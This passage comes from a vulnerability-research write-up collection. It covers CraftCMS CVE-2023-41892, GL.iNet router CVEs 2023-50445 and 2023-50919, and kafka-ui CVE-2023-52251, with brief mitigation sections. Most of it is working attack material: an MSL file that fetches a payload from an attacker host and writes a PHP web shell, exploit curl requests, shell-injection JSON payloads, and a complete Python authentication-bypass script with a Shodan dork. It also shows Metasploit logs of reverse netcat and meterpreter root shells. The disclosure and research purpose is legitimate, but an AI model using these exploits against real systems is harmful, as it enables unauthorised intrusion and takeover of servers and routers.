    Build Date 
  </td>
  <td class="v">
    Nov 24 2023 13:12:14 
  </td>
</tr>
<tr><td class="e">
    Build System 
  </td>
<td class="v">
    Linux 
  </td>
</tr>
<tr><td class="e">
    Server API 
  </td>
<td class="v">
   FPM/FastCGI 
   </td>
</tr>
--- ETC ETC ---
```
This is pretty cool, but it is quite limited what you can execute. 
For instance, PHP `system()` calls with arguments do not work as well as inline PHP code. We have to find other gadgets that can deliver a full RCE using this flaw.

Let's go back to the [article](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) written by `Arseniy Sharoglazov`. In the last section of his article, he explains `the Imagick Extension` and more specific to use this extension in combination with the `Magick Scripting Language (MSL)` to trigger a full RCE using PHP object instantiation (see section Imagick Extension and RCE #2: VID Scheme).

And surprise, surprise, CraftCMS is using this `Imagick Extension` which allows us to build a full RCE.

Using the `Imagick` constructor class in combination with `MSL` and a `VID` schema allows you to read and write images. This can be used to build an out of band RCE reading an image file with PHP code from the attacker controlled host and write it back to the `CraftCMS` host for execution.

**Step 1:**
Create an `MSL` file (`pawn.msl`) that downloads a vulnerable payload from the attacker host and writes it to `CraftCMS` instance.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="http://attacker_ip:8000/vuln.png" />
 <write filename="/var/www/html/web/shell.php" />
</image>
```
**Step 2:**
Create the `vuln.png` by adding PHP code to a small PNG image and host it on the attacker machine
```shell
exiftool -comment="<?php phpinfo(); ?>" vuln.png
python3 -m http.server 8000
```
**Step 3:**
Call the `Imagick` constructor class to upload the `MSL` file.
This typically creates a `MSL` file with a random filename starting with `php<random chars>` in the `/tmp` directory on the `CraftCMS` instance.
```shell
curl -sk "https://craftcms-vuln.ddev.site" -x localhost:8080 -X POST -H 'Content-Type: multipart/form-data' -F 'action=conditions/render' -F 'configObject[class]=craft\elements\conditions\ElementCondition' -F 'config={"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:/dev/null"}}}' -F 'filename=@pawn.msl'
```
**Step 4:**
Trigger the `MSL` file execution using `Imagick` constructor class again.
You should see the vulnerable PNG getting downloaded from the attacker machine and copied to `shell.php` on the `CraftCMS` instance.
```shell
curl -sk "https://craftcms-vuln.ddev.site" -x localhost:8080 -X POST -d 'action=conditions/render&configObject[class]=craft\elements\conditions\ElementCondition&config={"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:/tmp/php*"}}}'
```
**Step 5:**
Run the vulnerable shell code (`shell.php`) and you should see the `phpinfo` back in the response.
```shell
curl -k "https://craftcms-vuln.ddev.site/shell.php" -x localhost:8080 --output -
```
And things get even better, because you can avoid the out of band download by using `caption:` and `info:` schemes. The combination of both allows to create a web shell in one go using the `MSL` syntax below.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="caption:&lt;?php phpinfo(); ?&gt;" />
 <write filename="info:/var/www/html/web/shell.php" />
</image>
```
I have created a Metasploit module that checks the vulnerability of a target and makes use of the vulnerability to exploit the target. It allows you to choose from different target options such as deploying and launching a PHP webshell, performing a UNIX command injection or launching native Linux Meterpreter.
You can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/craftcms_unauth_rce_cve_2023_41892.rb) in my local repository or as [PR 18612](https://github.com/rapid7/metasploit-framework/pull/18612) at the Metasploit Github development.

### Mitigation
You should update your `CraftCMS` application to the latest version or at least to `4.4.15`.

### References
[CVE-2023-41892](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-41892)
[CraftCMS RCE analysis](https://blog.calif.io/p/craftcms-rce)
[CraftCMS Advisory](https://github.com/advisories/GHSA-4w8r-3xrw-v25g)
[Exploiting Arbitrary Object Instantiations in PHP without Custom Classes](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
[CraftCMS Unauthenticated RCE - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/craftcms_unauth_rce_cve_2023_41892.rb)
[CraftCMS Unauthenticated RCE - Metasploit PR 18612](https://github.com/rapid7/metasploit-framework/pull/18612)
[CraftCMS Installation](https://craftcms.com/docs/getting-started-tutorial/install/)
[CraftCMS downloading previous versions](https://craftcms.com/knowledge-base/downloading-previous-craft-versions)


### Credits
* `thanhc - https://substack.com/@thanhc`  discovery of the vulnerability
* `Arseniy Sharoglazov - https://swarm.ptsecurity.com/author/arseniy-sharoglazov/`
* `chybeta - https://github.com/chybeta`



 

---

## CVE-2023-50445
*Posted 2024-01-03 · last revised 2024-01-07*

> Shell Injection vulnerability GL.iNet A1300 v4.4.6, AX1800 v4.4.6, AXT1800 v4.4.6, MT3000 v4.4.6, MT2500 v4.4.6, MT6000 v4.5.0, MT1300 v4.3.7, MT300N-V2 v4.3.7, AR750S v4.3.7, AR750 v4.3.7, AR300M v4.3.7, and B1300 v4.3.7., allows local attackers to execute arbitrary code via the get_system_log and get_crash_log functions of the logread module, as well as the upgrade_online function of the upgrade module.

This report describes the Shell Metacharacter Injection vulnerability recently discovered in GL.iNet products. The vulnerability exists in the `get_system_log` and `get_crash_log` functions of the `logread` module, as well as the `upgrade_online` function of the `upgrade` module. It allows execution of malicious shell commands through externally provided parameters, thereby enabling control over the related products.

Attackers can manipulate routers by passing malicious shell commands through the API (v4).

**get_system_log function**
```json
{
	"jsonrpc": "2.0",
	"id": 11,
	"method": "call",
	"params": [
		"NsPHdkXtENoaotxVZWLqJorU52O7J0OI",
		"logread",
		"get_system_log",
		{
			"lines": "| echo pawned >/tmp/lines.pawned",
			"module": "| echo pawned >/tmp/module.pawned"
		}
	]
}
```
**get_crash_log function**
```json
{
	"jsonrpc": "2.0",
	"id": 11,
	"method": "call",
	"params": [
		"NsPHdkXtENoaotxVZWLqJorU52O7J0OI",
		"logread",
		"get_crash_log",
		{
			"mode": "| echo pawned >/tmp/mode.pawned",
			"log_number": "| echo pawned >/tmp/log_number.pawned"
		}
	]
}
```
**upgrade_online function**
```json
{
	"jsonrpc": "2.0",
	"id": 11,
	"method": "call",
	"params": [
		"NsPHdkXtENoaotxVZWLqJorU52O7J0OI",
		"upgrade",
		"upgrade_online",
		{
			"url": "| echo pawned >/tmp/url.pawned",
			"sha256": "| echo pawned >/tmp/sha256.pawned",
			"keep_config": "| echo pawned >/tmp/keep_config.pawned",
			"keep_package": "| echo pawned >/tmp/keep_package.pawned"
		}
	]
}
```
This vulnerability requires post-authentication with a SessionID (`SID`) to be successful. This authentication can be circumvented by chaining this vulnerability with [CVE-2023-50919](https://attackerkb.com/topics/LdqSuqHKOj/cve-2023-50919) where the `SID` can be retrieved without any credential knowledge, hence making this exploit pre-authenticated.

I created a new module that determines the GL.iNet device model, firmware information and architecture to check if the device is vulnerable and chained the two vulnerabilities.
I have tested this module using `FirmAE` to emulate a GL.iNet device AR300M16 with firmware `openwrt-ar300m16-4.3.7-0913-1694589994.bin`.

### Module in Action
**GL.iNet AR300M16 emulated target**
```shell
# ./run.sh -d GL.iNet /root/FirmAE/firmwares/openwrt-ar300m16-4.3.7-0913-1694589994.bin
[*] /root/FirmAE/firmwares/openwrt-ar300m16-4.3.7-0913-1694589994.bin emulation start!!!
[*] extract done!!!
[*] get architecture done!!!
mke2fs 1.47.0 (5-Feb-2023)
mknod: /dev/console: File exists
e2fsck 1.47.0 (5-Feb-2023)
[*] infer network start!!!

[IID] 91
[MODE] debug
[+] Network reachable on 192.168.1.1!
[+] Run debug!
Creating TAP device tap91_0...
Set 'tap91_0' persistent and owned by uid 0
Bringing up TAP device...
Starting emulation of firmware... 192.168.1.1 true false 11.438110994 -1
/root/FirmAE/./debug.py:7: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
  import telnetlib
[*] firmware - openwrt-ar300m16-4.3.7-0913-1694589994
[*] IP - 192.168.1.1
[*] connecting to netcat (192.168.1.1:31337)
[-] failed to connect netcat
------------------------------
|       FirmAE Debugger      |
------------------------------
1. connect to socat
2. connect to shell
3. tcpdump
4. run gdbserver
5. file transfer
6. exit
> 1
/ #
/ # ifconfig
ifconfig
br-lan    Link encap:Ethernet  HWaddr 52:54:00:12:34:56
          inet addr:192.168.8.1  Bcast:192.168.8.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:392 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:33970 (33.1 KiB)  TX bytes:0 (0.0 B)

eth0      Link encap:Ethernet  HWaddr 52:54:00:12:34:56
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:427 errors:0 dropped:0 overruns:0 frame:0
          TX packets:44 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:42072 (41.0 KiB)  TX bytes:5068 (4.9 KiB)

eth1      Link encap:Ethernet  HWaddr 52:54:00:12:34:57
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:940 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:0 (0.0 B)  TX bytes:321480 (313.9 KiB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

/ # netstat -rn
netstat -rn
Kernel IP routing table
Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
192.168.8.0     0.0.0.0         255.255.255.0   U         0 0          0 br-lan
```
* You should now be able to `ping` the network address 192.168.8.1 from your host and run a `nmap` command to check the services (HTTP TCP port 80).
* NOTE: please check your tap network interface on your host because it might have the wrong IP setting. 
* You can change this with: `ip a del 192.168.1.2/24 dev tap91_0` and `ip a add 192.168.8.2/24 dev tap91_0`.

```shell
 # ifconfig tap91_0
tap91_0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.2  netmask 255.255.255.0  broadcast 0.0.0.0
        inet6 fe80::6c06:aff:fefb:ab29  prefixlen 64  scopeid 0x20<link>
        ether 6e:06:0a:fb:ab:29  txqueuelen 1000  (Ethernet)
        RX packets 39  bytes 4692 (4.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 50  bytes 4044 (3.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
```shell
# ping 192.168.8.1
PING 192.168.8.1 (192.168.8.1) 56(84) bytes of data.
64 bytes from 192.168.8.1: icmp_seq=1 ttl=64 time=9.2 ms
64 bytes from 192.168.8.1: icmp_seq=2 ttl=64 time=3.18 ms
^C
--- 192.168.8.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 2.384/5.650/8.916/3.266 ms
# nmap 192.168.8.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-03 14:47 UTC
Nmap scan report for 192.168.8.1
Host is up (0.020s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
53/tcp  open  domain
80/tcp  open  http
443/tcp open  https
MAC Address: 52:54:00:12:34:57 (QEMU virtual NIC)
```
You are now ready to test the module using the emulated router hardware on IP address 192.168.8.1.

```shell
msf6 exploit(linux/http/glinet_unauth_rce_cve_2023_50445) > info

       Name: GL.iNet Unauthenticated Remote Command Execution via the logread module.
     Module: exploit/linux/http/glinet_unauth_rce_cve_2023_50445
   Platform: Unix, Linux
       Arch: cmd, mipsle, mipsbe, armle
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2013-12-10

Provided by:
  h00die-gr3y <h00die.gr3y@gmail.com>
  Unknown
  DZONERZY

Module side effects:
 ioc-in-logs
 artifacts-on-disk

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
  =>  0   Unix Command
      1   Linux Dropper

Check supported:
  Yes

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT    80               yes       The target port (UDP)
  SID                       no        Session ID
  SSL      false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
  URIPATH                   no        The URI to use for this exploit (default is random)
  VHOST                     no        HTTP server virtual host


  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen o
                                      n all addresses.
  SRVPORT  8080             yes       The local port to listen on.

Payload information:

Description:
  A command injection vulnerability exists in multiple GL.iNet network products, allowing an attacker
  to inject and execute arbitrary shell commands via JSON parameters at the `gl_system_log` and `gl_crash_log`
  interface in the `logread` module.
  This exploit requires post-authentication using the `Admin-Token` cookie/sessionID (`SID`), typically stolen
  by the attacker.
  However, by chaining this exploit with vulnerability CVE-2023-50919, one can bypass the Nginx authentication
  through a `Lua` string pattern matching and SQL injection vulnerability. The `Admin-Token` cookie/`SID` can be
  retrieved without knowing a valid username and password.

  The following GL.iNet network products are vulnerable:
  - A1300, AX1800, AXT1800, MT3000, MT2500/MT2500A: v4.0.0 < v4.5.0;
  - MT6000: v4.5.0 - v4.5.3;
  - MT1300, MT300N-V2, AR750S, AR750, AR300M, AP1300, B1300: v4.3.7;
  - E750/E750V2, MV1000: v4.3.8;
  - and potentially others (just try ;-)

  NOTE: Staged meterpreter payloads might core dump on the target, so use stage-less meterpreter payloads
  when using the Linux Dropper target.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2023-50445
  https://nvd.nist.gov/vuln/detail/CVE-2023-50919
  https://attackerkb.com/topics/3LmJ0d7rzC/cve-2023-50445
  https://attackerkb.com/topics/LdqSuqHKOj/cve-2023-50919
  https://libdzonerzy.so/articles/from-zero-to-botnet-glinet.html
  https://github.com/gl-inet/CVE-issues/blob/main/4.0.0/Using%20Shell%20Metacharacter%20Injection%20via%20API.md


View the full module info with the info -d command.
```
### Scenarios
**FirmAE GL.iNet AR300M16 Router Emulation Unix Command -  cmd/unix/reverse_netcat**
```shell
msf6 exploit(linux/http/glinet_unauth_rce_cve_2023_50445) > set target 0
target => 0
msf6 exploit(linux/http/glinet_unauth_rce_cve_2023_50445) > exploit

[*] Started reverse TCP handler on 192.168.8.2:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.8.1:80 can be exploited.
[!] The service is running, but could not be validated. Product info: |4.3.7|n/a
[*] SID: NsPHdkXtENoaotxVZWLqJorU52O7J0OI
[*] Executing Unix Command for cmd/unix/reverse_netcat
[*] Command shell session 8 opened (192.168.8.2:4444 -> 192.168.8.1:53167) at 2024-01-03 11:12:18 +0000

pwd
/
id
uid=0(root) gid=0(root) groups=0(root),65533(nonevpn)
uname -a
Linux GL- 4.1.17+ #28 Sat Oct 31 17:56:39 KST 2020 mips GNU/Linux
exit
```
**FirmAE GL.iNet AR300M16 Router Emulation Linux Dropper -  linux/mipsbe/meterpreter_reverse_tcp**
```shell
msf6 exploit(linux/http/glinet_unauth_rce_cve_2023_50445) > set target 1
target => 1
msf6 exploit(linux/http/glinet_unauth_rce_cve_2023_50445) > exploit

[*] Started reverse TCP handler on 192.168.8.2:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.8.1:80 can be exploited.
[!] The service is running, but could not be validated. Product info: |4.3.7|n/a
[*] SID: Gs2KPnIsIQQUzHQkEBVN8JOcq5nV008e
[*] Executing Linux Dropper for linux/mipsbe/meterpreter_reverse_tcp
[*] Using URL: http://192.168.8.2:1981/OrfVHM15cua0w
[*] Client 192.168.8.1 (curl/7.88.1) requested /OrfVHM15cua0w
[*] Sending payload to 192.168.8.1 (curl/7.88.1)
[*] Meterpreter session 9 opened (192.168.8.2:4444 -> 192.168.8.1:48511) at 2024-01-03 08:30:52 +0000
[*] Command Stager progress - 100.00% done (117/117 bytes)
[*] Server stopped.

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : 192.168.8.1
OS           :  (Linux 4.1.17+)
Architecture : mips
BuildTuple   : mips-linux-muslsf
Meterpreter  : mipsbe/linux
meterpreter > 
```
You can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/glinet_unauth_rce_cve_2023_50445.rb) in my local repository or as [PR 18648](https://github.com/rapid7/metasploit-framework/pull/18648) at the Metasploit Github development.

### Mitigation
The following GL.iNet network devices are vulnerable. Please patch your devices to the latest firmware release.
 - A1300, AX1800, AXT1800, MT3000, MT2500/MT2500A => `v4.0.0 < v4.5.0`
 - MT6000 => `v4.5.0 - v4.5.3`
 - MT1300, MT300N-V2, AR750S, AR750, AR300M, AP1300, B1300 => `v4.3.7`
 - E750/E750V2, MV1000 => `v4.3.8`
 -  X3000: `v4.0.0 - v4.4.2`
 - XE3000: `v4.0.0 - v4.4.3`
 - SFT1200: `v4.3.6`
 - and potentially others...

### References
[CVE-2023-50445](https://nvd.nist.gov/vuln/detail/CVE-2023-50445)
[AttackerKB article: CVE-2023-50919 by h00die-gr3y](https://attackerkb.com/topics/LdqSuqHKOj/cve-2023-50919)
[From zero to botnet: GL.iNet going wild by DZONERZY](https://libdzonerzy.so/articles/from-zero-to-botnet-glinet.html)
[GL.iNet home page](https://www.gl-inet.com/)
[GL.iNet API 3.x documentation](https://dev.gl-inet.com/router-3.x-api/)
[GL.iNet API 4.x documentation](https://dev.gl-inet.com/router-4.x-api/)
[GL.iNet unauthenticated RCE - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/glinet_unauth_rce_cve_2023_50445.rb)
[GL.iNet unauthenticated RCE - Metasploit PR 18648](https://github.com/rapid7/metasploit-framework/pull/18648)
[FirmAE](https://github.com/pr0v3rbs/FirmAE)
[FirmAE: Towards Large-Scale Emulation of IoT Firmware for Dynamic Analysis](https://syssec.kaist.ac.kr/pub/2020/kim_acsac2020.pdf)

### Credits
* `DZONERZY`

And to all other good fellows who raised this concern ;-)


---

## CVE-2023-50919
*Posted 2024-01-03 · last revised 2024-01-07*

> An issue was discovered on GL.iNet devices before version 4.5.0. There is an NGINX authentication bypass via Lua string pattern matching. This affects A1300 4.4.6, AX1800 4.4.6, AXT1800 4.4.6, MT3000 4.4.6, MT2500 4.4.6, MT6000 4.5.0, MT1300 4.3.7, MT300N-V2 4.3.7, AR750S 4.3.7, AR750 4.3.7, AR300M 4.3.7, and B1300 4.3.7.

There is not yet an official record of this CVE available at the time of writing, but this is a critical vulnerability that gives an attacker unauthenticated access to a GL.iNet network devices. The issue is the bypass of `Nginx` authentication through a `Lua` string pattern matching and SQL injection vulnerability. There is an excellent writeup [From zero to botnet – GL.iNet going wild](https://libdzonerzy.so/articles/from-zero-to-botnet-glinet.html) by `DZONERZY` who discovered this vulnerability in October 2023.

I am not gonna repeat the whole article here, because you can read it for yourself, but I will quickly summarize the issue.
The flaw sits in the `/usr/sbin/gl-ngx-session`, the actual `Lua` handler for the authentication mechanism which is the standard for GL.iNet network devices.

Within the this code there is a loop through the `/etc/shadow file` to authenticate a user where the username is used for the lookup using a `regex`.
By manipulating the username with additional `regex` statements, one can manipulate the lookup, so that it retrieves the `uid` field instead of the `password` field, hence using this for a valid root login will return a session id (`SID`) to be used for authentication.
```lua
local function login_test(username, hash)
    if not username or username == "" then return false end

    for l in io.lines("/etc/shadow") do
        local pw = l:match('^' .. username .. ':([^:]+)')
        if pw then
            for nonce in pairs(nonces) do
                if utils.md5(table.concat({username, pw, nonce}, ":")) == hash then
                    nonces[nonce] = nil
                    nonce_cnt = nonce_cnt - 1
                    return true
                end
            end
            return false
        end
    end
```
Regex injection happens inside the `login_test function`; it tries to match everything from the first colon (the hashed password) until the next one. 
```
root:$1$j9T2jD$5KGIS/2Ug.47GjW0jHOIB/2XwYUafYPh/X:19447:0:99999:7:::
```
With the following username: `root:[^:]+:[^:]+` the regex in the code becomes `^root:[^:]+:[^:]+:([^:]+)` that shifts forward the matching group, thus making it return the `uid` (which is always 0) instead of the hashed password, which means that we can always win the authentication challenge by sending the following hash: `md5(<user>:0:<nonce>) -> root:[^:]+:[^:]+:0:<nonce>`.

Additionally, some ACL's are required that are stored in the `SQLite` db. This lookup, which is coded in `/usr/lib/lua/oui/db.lua`, is not successful because we manipulated the username. 
```lua
M.get_acl_by_username = function(username)
    if username == "root" then return "root" end

    local db = sqlite3.open(DB)
    local sql = string.format("SELECT acl FROM account WHERE username = '%s'", username)

    local aclgroup = ""

    for a in db:rows(sql) do
        aclgroup = a[1]
    end

    db:close()

    return aclgroup
end
```
However, by a brilliant combination of the regex and sql injection, `DZONERZY` was able to retrieve that information in one go with the username below.
```
roo[^'union selecT char(114,111,111,116)--]:[^:]+:[^:]+
```
Pretty cool !!! 

But unfortunately quite bad for our users who bought a GL.iNet network device, because at the time of writing most of the devices that are exposed to Internet (`shodan dork: title:"GL.iNet Admin Panel" `) are vulnerable for this authentication bypass. 
Even worse, in combination of [CVE-2023-50445](https://nvd.nist.gov/vuln/detail/CVE-2023-50445) all vulnerable GL.iNet network can be exploited without any authentication required. 
Please check out my [attackerKB article](https://attackerkb.com/topics/3LmJ0d7rzC/cve-2023-50445) for more info.

Below is a python script that checks if your device is vulnerable for `CVE-2023-50919`.
```python
#!/usr/bin/env python3

# Exploit Title: GL.iNet Authentication bypass
# Shodan Dork: title:"GL.iNet Admin Panel"
# Date: 30/12/2023
# Exploit Author: h00die-gr3y@gmail.com
# Vendor Homepage: https://www.gli-inet.com
# Software Link: https://dl.gl-inet.com/?model=ar300m16
# Firmware: openwrt-ar300m16-4.3.7-0913-1694589994.bin
# Version: 4.3.7
# Tested on: GL.iNet AR300M16
# CVE: CVE-2023-50919

import json
import requests
import hashlib
import time
from random import randint
from sys import stdout, argv

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080',
}

proxies = {} # no proxy

def get_challenge(url):
        data = {
                'jsonrpc': '2.0',
                'id': randint(1000, 9999),
                'method': 'challenge',
                'params': {'username': 'root'}
        }
        try:
                res = requests.post(url, json=data, verify=False, proxies=proxies)
                res.raise_for_status()
                res_json = json.loads(res.content)
                if 'result' in res_json:
                        return res_json['result']['nonce']
                print('[-] Error: could not find nonce')
                return False
        except requests.exceptions.RequestException:
                print('[-] Error while retrieving challenge')
        return False


def login(url, username, hash):
        data = {
                'jsonrpc': '2.0',
                'id': randint(1000, 9999),
                'method': 'login',
                'params': {
                        'username': '{}'.format(username),
                        'hash': '{}'.format(hash)}
        }
        try:
                res = requests.post(url, json=data, verify=False, proxies=proxies)
                res.raise_for_status()
                res_json = json.loads(res.content)
                if 'result' in res_json:
                        return res_json['result']['sid']
                print('[-] Error: could not find sid')
                return False

        except requests.exceptions.RequestException:
                print('[-] Error while retrieving sid')
        return False

def main(url):
        print('[+] Started GL.iNet - Authentication Bypass exploit')
        username = "roo[^'union selecT char(114,111,111,116)--]:[^:]+:[^:]+"
        pw = '0'
        print('[+] Get challenge and login')
        start = time.time()
        nonce = get_challenge(url+'/rpc')
        if nonce:
                print('[+] nonce: {}'.format(nonce))
                hash_str = username+':'+pw+':'+nonce
                hash = hashlib.md5(hash_str.encode('utf-8')).hexdigest()
                print('[+] hash: {}'.format(hash))
                sid = login(url+'/rpc', username, hash)
                print(f'[+] Time elapsed: {time.time() - start}')
                if sid:
                        print('[+] sid: {}'.format(sid))


if __name__ == '__main__':
        if len(argv) < 2:
                print('Usage: {} <TARGET_URL>'.format(argv[0]))
                exit(1)

        main(argv[1])
```
```shell
# python ./auth-bypass.py http://192.168.8.1
[+] Started GL.iNet - Authentication Bypass exploit
[+] Get challenge and login
[+] nonce: 9B5p5lcK8V1rPu7tiwaKccPKkA8ijpwt
[+] hash: 01f250624caab2acaf4feb290dd45d33
[+] Time elapsed: 2.650479793548584
[+] sid: rGZXQdxPkFzv1KwNaXTcWos6OLTnjU3e
```

### Mitigation
The following GL.iNet network devices are vulnerable. Please patch your devices to the latest firmware release.
 - A1300, AX1800, AXT1800, MT3000, MT2500/MT2500A: `v4.0.0 < v4.5.0`
 - MT6000: `v4.5.0 - v4.5.3`
 - MT1300, MT300N-V2, AR750S, AR750, AR300M, AP1300, B1300: `v4.3.7`
 - E750/E750V2, MV1000: `v4.3.8`
 -  X3000: `v4.0.0 - v4.4.2`
 - XE3000: `v4.0.0 - v4.4.3`
 - SFT1200: `v4.3.6`
 - and potentially others...

### References
[From zero to botnet: GL.iNet going wild by DZONERZY](https://libdzonerzy.so/articles/from-zero-to-botnet-glinet.html)
[CVE-2023-50445](https://nvd.nist.gov/vuln/detail/CVE-2023-50445)
[AttackerKB article: CVE-2023-50445 by h00die-gr3y](https://attackerkb.com/topics/3LmJ0d7rzC/cve-2023-50445)
[GL.iNet home page](https://www.gl-inet.com/)

### Credits
* `DZONERZY`


---

## CVE-2023-52251
*Posted 2024-01-20 · last revised 2024-02-04*

> An issue discovered in provectus kafka-ui 0.4.0 through 0.7.1 allows remote attackers to execute arbitrary code via the q parameter of /api/clusters/local/topics/{topic}/messages.

[Kafka UI]( https://github.com/provectus/kafka-ui) is a nice web front-end that provides a fast and lightweight web UI for managing Apache Kafka® clusters developed by provectus.
Unfortunately there is a Remote Code Execution vulnerability at the latest version `0.7.1` that was discovered and disclosed on Sep 27, 2023 to provectus, but not yet patched.
The vulnerability can be exploited via the `q` parameter at `/api/clusters/local/topics/{topic}/messages` endpoint which allows the use to define a `Groovy` script filter. There is no sanitation of the groovy script filter before it is executed. This allows an attacker to execute arbitrary code on the server.

The vulnerable code can be found in the function [groovyScriptFilter](https://github.com/provectus/kafka-ui/blob/master/kafka-ui-api/src/main/java/com/provectus/kafka/ui/emitter/MessageFilters.java#L41>):
```groovy
  static Predicate<TopicMessageDTO> groovyScriptFilter(String script) {
    var engine = getGroovyEngine();
    var compiledScript = compileScript(engine, script);
    var jsonSlurper = new JsonSlurper();
    return new Predicate<TopicMessageDTO>() {
      @SneakyThrows
      @Override
      public boolean test(TopicMessageDTO msg) {
        var bindings = engine.createBindings();
        bindings.put("partition", msg.getPartition());
        bindings.put("offset", msg.getOffset());
        bindings.put("timestampMs", msg.getTimestamp().toInstant().toEpochMilli());
        bindings.put("keyAsText", msg.getKey());
        bindings.put("valueAsText", msg.getContent());
        bindings.put("headers", msg.getHeaders());
        bindings.put("key", parseToJsonOrReturnAsIs(jsonSlurper, msg.getKey()));
        bindings.put("value", parseToJsonOrReturnAsIs(jsonSlurper, msg.getContent()));

        var result = compiledScript.eval(bindings);  <==== vulnerable code
        
        if (result instanceof Boolean) {
          return (Boolean) result;
        } else {
          throw new ValidationException(
              "Unexpected script result: %s, Boolean should be returned instead".formatted(result));
        }
      }
    };
  }
```
The exploit is pretty simple to execute by the request below:
We are using a Groovy OS execution code snippet `"touch /tmp/cuckoo".execute();` to test the vulnerability.
You need an active Kafka cluster, in this case our cluster is named `local` and a topic (`cuckoo`) which you can create if there are no topics.
```shell
curl 'http://192.168.201.25:8080/api/clusters/local/topics/cuckoo/messages?q=%22touch%20%2Ftmp%2Fcuckoo%22.execute()&filterQueryType=GROOVY_SCRIPT&attempt=4&limit=100&page=0&seekDirection=FORWARD&keySerde=String&valueSerde=String&seekType=BEGINNING'
```
```shell
/tmp $ ls -l
total 4
-rw-r--r--    1 kafkaui  kafkaui          0 Jan 24 16:26 cuckoo
drwxr-xr-x    2 kafkaui  kafkaui       4096 Jan 24 16:25 hsperfdata_kafkaui
/tmp $ 
```
Pretty simple, right? 
And without any authentication!!!

If you want to make a more complex system command,  you should not use `"my commandline".execute()` because it can not handle unix pipe `|`, redirection `>` and command chaining with `;`.
You better use some Groovy scripting along the lines like below:
 `"Process p=new ProcessBuilder(\"sh\",\"-c\",\"<my complex cmd_line>\").redirectErrorStream(true).start()"`

If you want to play around with this vulnerability, just follow the steps below to install a vulnerable Kafka-ui instance with an active Kafka cluster.

### Installation steps to install Kafka ui
* Install `Docker` on your preferred platform. 
*  Here are the installation instructions for [Docker Desktop on MacOS](https://docs.docker.com/desktop/install/mac-install/).
* Create a empty directory (`kafka-ui`).
* Create the following `docker-compose.yaml` file in the directory. This will automatically create a Kafka cluster with Kafka-ui. You can modify the `v0.7.0` in the `yaml` file to pull different versions.
```
version: '2'

networks:
  rmoff_kafka:
    name: rmoff_kafka

services:
  zookeeper:
    image: confluentinc/cp-zookeeper:latest
    container_name: zookeeper
    networks:
      - rmoff_kafka
    environment:
      ZOOKEEPER_CLIENT_PORT: 2181
      ZOOKEEPER_TICK_TIME: 2000
    ports:
      - 22181:2181

  kafka:
    image: confluentinc/cp-kafka:latest
    container_name: kafka
    networks:
      - rmoff_kafka
    depends_on:
      - zookeeper
    ports:
      - 29092:9092
    environment:
      KAFKA_BROKER_ID: 1
      KAFKA_ZOOKEEPER_CONNECT: zookeeper:2181
      KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://kafka:9092,PLAINTEXT_HOST://localhost:29092
      KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: PLAINTEXT:PLAINTEXT,PLAINTEXT_HOST:PLAINTEXT
      KAFKA_INTER_BROKER_LISTENER_NAME: PLAINTEXT
